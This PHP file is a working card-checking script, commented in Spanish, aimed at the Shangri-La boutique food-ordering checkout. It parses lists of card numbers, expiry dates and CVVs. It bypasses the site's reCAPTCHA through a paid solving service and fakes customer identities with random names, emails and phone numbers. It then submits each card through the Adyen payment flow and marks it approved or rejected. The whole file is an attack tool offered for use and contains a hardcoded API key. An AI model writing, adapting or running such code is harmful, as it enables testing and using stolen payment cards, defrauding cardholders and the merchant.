<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==============================
// FUNCIONES PRINCIPALES
// ==============================

function makeRequest($url, $data, $headers = [], $isJson = true) {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $postData = $isJson ? json_encode($data) : http_build_query($data);
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_ENCODING => 'gzip'
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'success' => ($http_code >= 200 && $http_code < 300) && empty($error)
    ];
}

function solveRecaptchaV2($siteKey) {
    // NECESITAS UNA API KEY DE 2CAPTCHA O SIMILAR
    $apiKey = "T300200c245197d2f4b79d1c319a662f8"; // <-- REEMPLAZA ESTO
    
    if ($apiKey === "300200c245197d2f4b79d1c319a662f8") {
        // Si no tienes API key, devuelve un token de prueba (probablemente fallará)
        return "TEST_TOKEN_NO_VALIDO_" . md5(time());
    }
    
    // Enviar CAPTCHA a resolver
    $postData = [
        'key' => $apiKey,
        'method' => 'userrecaptcha',
        'googlekey' => $siteKey,
        'pageurl' => 'https://boutique.shangri-la.com/food_checkout.php',
        'json' => 1
    ];
    
    $ch = curl_init('https://2captcha.com/in.php');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30
    ]);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    $response = json_decode($result, true);
    
    if ($response['status'] == 1) {
        $captchaId = $response['request'];
        
        // Esperar 10-20 segundos
        for ($i = 0; $i < 20; $i++) {
            sleep(1);
            
            $ch = curl_init("https://2captcha.com/res.php?key={$apiKey}&action=get&id={$captchaId}&json=1");
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10
            ]);
            
            $result = curl_exec($ch);
            curl_close($ch);
            
            $solution = json_decode($result, true);
            
            if ($solution['status'] == 1) {
                return $solution['request'];
            }
        }
    }
    
    return false;
}

// ==============================
// VALIDACIÓN DE ENTRADA
// ==============================

if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">Error</span> ➔ No se recibió lista...'
    ]);
    exit();
}

$lista = trim($_GET['lista']);
$lista = str_replace([';',':','/','»','«','>','<','=>',' ',','], '|', $lista);
$parts = explode('|', $lista);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Formato: ' . htmlspecialchars($lista)
    ]);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validaciones básicas
if (strlen($cc) < 15 || strlen($cc) > 16) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Número inválido...'
    ]);
    exit();
}

if ($mes < 1 || $mes > 12) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Mes inválido...'
    ]);
    exit();
}

// Formatear fecha
if (strlen($mes) == 1) $mes = "0" . $mes;
if (strlen($ano) == 2) $ano = "20" . $ano;

// Validar fecha
$current_year = date('Y');
$current_month = date('n');
if ($ano < $current_year || ($ano == $current_year && $mes < $current_month)) {
    echo json_encode([
        'status' => 'rejected',
        'message' => 'Tarjeta expirada',
        'html' => '<span class="badge badge-danger">Rechazada</span> ➔ Tarjeta expirada'
    ]);
    exit();
}

// Determinar tipo de tarjeta
$tipo = "VISA";
$first_digit = substr($cc, 0, 1);
$first_two = substr($cc, 0, 2);

if ($first_digit == '4') $tipo = "VISA";
if ($first_digit == '5') $tipo = "MASTERCARD";
if ($first_two == '34' || $first_two == '37') $tipo = "AMEX";
if (substr($cc, 0, 2) == '30' || substr($cc, 0, 2) == '36' || substr($cc, 0, 2) == '38') $tipo = "DINERS";
if (substr($cc, 0, 2) == '35') $tipo = "JCB";
if (substr($cc, 0, 4) == '6011') $tipo = "DISCOVER";

// ==============================
// FLUJO PRINCIPAL
// ==============================

try {
    // CONFIGURACIÓN (extraída del JavaScript)
    $client_id = "14";
    $promotion_id = "1";
    $api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
    $api_locale = "en";
    $payment_method = "adyen";
    $hotel_code = "ISL";
    
    echo "<!-- Iniciando proceso para tarjeta: " . substr($cc, 0, 6) . "******" . substr($cc, -4) . " -->\n";
    
    // PASO 1: OBTENER SITE LOGIN TOKEN
    echo "<!-- Paso 1: Obteniendo site_login_token -->\n";
    $site_login_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => ""
    ];
    
    $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
    
    if (!$site_result['success']) {
        throw new Exception("Error al conectar con el sitio: " . $site_result['error']);
    }
    
    $site_response = json_decode($site_result['response'], true);
    
    if (!isset($site_response['site_login_token'])) {
        throw new Exception("No se pudo obtener token de acceso");
    }
    
    $site_login_token = $site_response['site_login_token'];
    echo "<!-- site_login_token obtenido -->\n";
    
    // PASO 2: RESOLVER reCAPTCHA
    echo "<!-- Paso 2: Resolviendo reCAPTCHA -->\n";
    $recaptchaSiteKey = "6LeuX6kqAAAAAPUJ_HhZ6vT8lfObBJ36wdHuRnfj"; // Del JavaScript
    $recaptchaToken = solveRecaptchaV2($recaptchaSiteKey);
    
    if (!$recaptchaToken) {
        throw new Exception("No se pudo resolver el reCAPTCHA");
    }
    
    echo "<!-- reCAPTCHA resuelto -->\n";
    
    // PASO 3: CREAR CARRITO (cart_add_product.php)
    echo "<!-- Paso 3: Creando carrito -->\n";
    
    // Primero necesitamos un producto para el carrito
    // Buscar productos disponibles
    $product_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "site_login_token" => $site_login_token,
        "lang" => $api_locale,
        "category_name" => "Hot Food",
        "is_food" => 1,
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d"),
        "shipping_time" => "12:00 - 13:00",
        "hotel" => $hotel_code,
        "outlet_name" => "",
        "food_category_name" => "All"
    ];
    
    $product_result = makeRequest($api_endpoint . "/product_get.php", $product_data);
    
    $product_id = null;
    if ($product_result['success']) {
        $product_response = json_decode($product_result['response'], true);
        if (isset($product_response['products'][0]['id'])) {
            $product_id = $product_response['products'][0]['id'];
            echo "<!-- Producto encontrado: ID " . $product_id . " -->\n";
        }
    }
    
    // Si no encontramos producto, usamos uno por defecto
    if (!$product_id) {
        $product_id = 1; // Producto por defecto
        echo "<!-- Usando producto por defecto: ID " . $product_id . " -->\n";
    }
    
    // Agregar producto al carrito
    $cart_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "site_login_token" => $site_login_token,
        "lang" => $api_locale,
        "cart_id" => "",
        "product_id" => $product_id,
        "quantity" => 1,
        "additional_information" => "",
        "food_option_groups" => [],
        "clear_cart" => true,
        "order_type" => "express"
    ];
    
    $cart_result = makeRequest($api_endpoint . "/cart_add_product.php", $cart_data);
    
    if (!$cart_result['success']) {
        // Continuar aunque falle el carrito
        echo "<!-- Nota: Error al crear carrito, continuando... -->\n";
    } else {
        echo "<!-- Carrito creado exitosamente -->\n";
    }
    
    // PASO 4: OBTENER DATOS DEL CARRITO
    echo "<!-- Paso 4: Obteniendo datos del carrito -->\n";
    $cart_get_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "site_login_token" => $site_login_token,
        "lang" => $api_locale,
        "hotel_code" => $hotel_code,
        "user_id" => "",
        "login_token" => "",
        "shipping_fee" => 0,
        "is_food_site" => 1,
        "order_type" => "express",
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d"),
        "shipping_time" => "12:00 - 13:00"
    ];
    
    $cart_get_result = makeRequest($api_endpoint . "/cart_get.php", $cart_get_data);
    
    $order_amount = 100; // Monto por defecto
    if ($cart_get_result['success']) {
        $cart_response = json_decode($cart_get_result['response'], true);
        // Calcular monto total
        if (isset($cart_response['products']) && is_array($cart_response['products'])) {
            $order_amount = 0;
            foreach ($cart_response['products'] as $product) {
                if (isset($product['sale_price'])) {
                    $order_amount += $product['sale_price'] * $product['quantity'];
                }
            }
        }
        echo "<!-- Monto del carrito: " . $order_amount . " -->\n";
    }
    
    // PASO 5: CHECKOUT INIT (crear orden)
    echo "<!-- Paso 5: Creando orden -->\n";
    $checkout_init_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "hotel_code" => $hotel_code,
        "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
        "order_amount" => $order_amount,
        "payment_method" => $payment_method
    ];
    
    $init_result = makeRequest($api_endpoint . "/checkout_init.php", $checkout_init_data);
    
    if (!$init_result['success']) {
        throw new Exception("Error al crear orden: " . $init_result['error']);
    }
    
    $init_response = json_decode($init_result['response'], true);
    
    if (!isset($init_response['order_number']) || !isset($init_response['order_token'])) {
        throw new Exception("Respuesta inválida al crear orden");
    }
    
    $order_number = $init_response['order_number'];
    $order_token = $init_response['order_token'];
    echo "<!-- Orden creada: #" . $order_number . " -->\n";
    
    // PASO 6: ENCRIPTAR TARJETA CON ADYEN
    echo "<!-- Paso 6: Encriptando datos de tarjeta -->\n";
    
    // Necesitamos la clave pública de Adyen del servidor
    // Intentar obtenerla del endpoint de encriptación
    $adyen_encrypt_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "order_number" => $order_number,
        "order_token" => $order_token,
        "card" => $cc,
        "month" => (int)$mes,
        "year" => $ano,
        "cvv" => $cvv,
        "adyen_key" => "", // Se obtendrá del servidor
        "adyen_version" => "_0_1_25"
    ];
    
    $encrypt_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $adyen_encrypt_data);
    
    $encryptedCardNumber = "";
    $encryptedExpiryMonth = "";
    $encryptedExpiryYear = "";
    $encryptedSecurityCode = "";
    
    if ($encrypt_result['success']) {
        $encrypt_response = json_decode($encrypt_result['response'], true);
        if (isset($encrypt_response['encryptedCardNumber'])) {
            $encryptedCardNumber = $encrypt_response['encryptedCardNumber'];
            $encryptedExpiryMonth = $encrypt_response['encryptedExpiryMonth'];
            $encryptedExpiryYear = $encrypt_response['encryptedExpiryYear'];
            $encryptedSecurityCode = $encrypt_response['encryptedSecurityCode'];
            echo "<!-- Tarjeta encriptada exitosamente -->\n";
        }
    }
    
    // Si falla la encriptación, continuamos igual (algunos flujos no la requieren)
    
    // PASO 7: REALIZAR CHECKOUT (pago)
    echo "<!-- Paso 7: Procesando pago -->\n";
    
    // Generar datos aleatorios para el usuario
    $nombres = ['John', 'David', 'Michael', 'Robert', 'William', 'James', 'Thomas', 'Christopher'];
    $apellidos = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'];
    $nombre = $nombres[array_rand($nombres)];
    $apellido = $apellidos[array_rand($apellidos)];
    $email = strtolower($nombre) . '.' . strtolower($apellido) . rand(100, 999) . '@gmail.com';
    $phone = '+852' . rand(50000000, 99999999);
    
    // Datos de checkout según el JavaScript
    $checkout_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "",
        "login_token" => "",
        "payment_method" => $payment_method,
        "first_name" => $nombre,
        "last_name" => $apellido,
        "email" => $email,
        "phone" => $phone,
        "chk_register" => 0,
        "chk_same_address" => 1,
        "address" => "Test Address 123",
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d", strtotime("+1 day")),
        "shipping_time" => "12:00 - 13:00",
        "order_remark" => "",
        "alcohol_terms" => 0,
        "cutlery_service" => 1,
        "card_type" => $tipo,
        "card_issuer" => $tipo,
        "country_id" => "",
        "region" => "1",
        "district_group" => "1",
        "district" => "1",
        "pickup_store" => "",
        "is_food_site" => "1",
        "order_type" => "express",
        "recaptcha_type" => "v2",
        "recaptcha_token" => $recaptchaToken,
        // Datos encriptados de tarjeta (si se obtuvieron)
        "encryptedCardNumber" => $encryptedCardNumber,
        "encryptedExpiryMonth" => $encryptedExpiryMonth,
        "encryptedExpiryYear" => $encryptedExpiryYear,
        "encryptedSecurityCode" => $encryptedSecurityCode,
        // También enviar datos directos (por si acaso)
        "card_number" => $cc,
        "card_expiry_month" => $mes,
        "card_expiry_year" => $ano,
        "card_cvv" => $cvv
    ];
    
    // Añadir order_number y order_token si están disponibles
    if ($order_number) {
        $checkout_data['order_number'] = $order_number;
        $checkout_data['order_token'] = $order_token;
    }
    
    echo "<!-- Enviando datos de pago... -->\n";
    $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);
    
    if (!$checkout_result['success']) {
        throw new Exception("Error en el proceso de checkout: " . $checkout_result['error']);
    }
    
    $checkout_response = json_decode($checkout_result['response'], true);
    echo "<!-- Respuesta del checkout recibida -->\n";
    
    // ==============================
    // PROCESAR RESPUESTA
    // ==============================
    
    $card_masked = substr($cc, 0, 6) . '******' . substr($cc, -4);
    $expiry_masked = $mes . '/' . substr($ano, -2);
    
    // Analizar respuesta
    if (isset($checkout_response['status'])) {
        if ($checkout_response['status'] == 'success') {
            // ÉXITO: Pago aprobado
            $resultCode = isset($checkout_response['direct_post']['resultCode']) ? 
                         $checkout_response['direct_post']['resultCode'] : 'Authorised';
            
            if ($resultCode == 'Authorised') {
                $html = '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                       '<span class="badge badge-success">SHANGRI-LA EXPRESS</span>';
                
                $data = [
                    'card' => $card_masked,
                    'expiry' => $expiry_masked,
                    'bin' => substr($cc, 0, 6),
                    'last4' => substr($cc, -4),
                    'order_number' => isset($checkout_response['display_order_number']) ? 
                                     $checkout_response['display_order_number'] : $order_number,
                    'amount' => isset($checkout_response['direct_post']['amount']) ? 
                               number_format($checkout_response['direct_post']['amount']/100, 2) . ' HKD' : 
                               number_format($order_amount/100, 2) . ' HKD',
                    'result_code' => $resultCode
                ];
                
                echo json_encode([
                    'status' => 'approved',
                    'message' => 'Pago autorizado',
                    'html' => $html,
                    'data' => $data
                ]);
            } else {
                // Otro código de resultado
                $html = '<span class="badge badge-warning">⚠️ ' . $resultCode . '</span> ➔ ' .
                       '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                       '<span class="badge badge-warning">Resultado: ' . $resultCode . '</span>';
                
                echo json_encode([
                    'status' => 'pending',
                    'message' => 'Resultado: ' . $resultCode,
                    'html' => $html,
                    'data' => [
                        'card' => $card_masked,
                        'expiry' => $expiry_masked,
                        'result_code' => $resultCode
                    ]
                ]);
            }
            
        } else {
            // ERROR: Pago rechazado
            $error_msg = isset($checkout_response['error']) ? $checkout_response['error'] : 'Rechazado';
            
            $html = '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
                   '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                   '<span class="badge badge-warning">' . $error_msg . '</span>';
            
            echo json_encode([
                'status' => 'rejected',
                'message' => $error_msg,
                'html' => $html,
                'data' => [
                    'card' => $card_masked,
                    'expiry' => $expiry_masked,
                    'reason' => $error_msg
                ]
            ]);
        }
    } else {
        // Respuesta inesperada
        $response_text = substr($checkout_result['response'], 0, 200);
        throw new Exception("Respuesta inesperada: " . $response_text);
    }
    
} catch (Exception $e) {
    // Manejo de errores
    $card_masked = isset($cc) ? substr($cc, 0, 6) . '******' . substr($cc, -4) : 'N/A';
    $expiry_masked = isset($mes) && isset($ano) ? $mes . '/' . substr($ano, -2) : 'N/A';
    $tipo = isset($tipo) ? $tipo : 'Desconocido';
    
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                 '<span class="badge badge-warning">' . $e->getMessage() . '</span>',
        'data' => [
            'card' => $card_masked,
            'expiry' => $expiry_masked,
            'error' => $e->getMessage()
        ]
    ]);
}
?>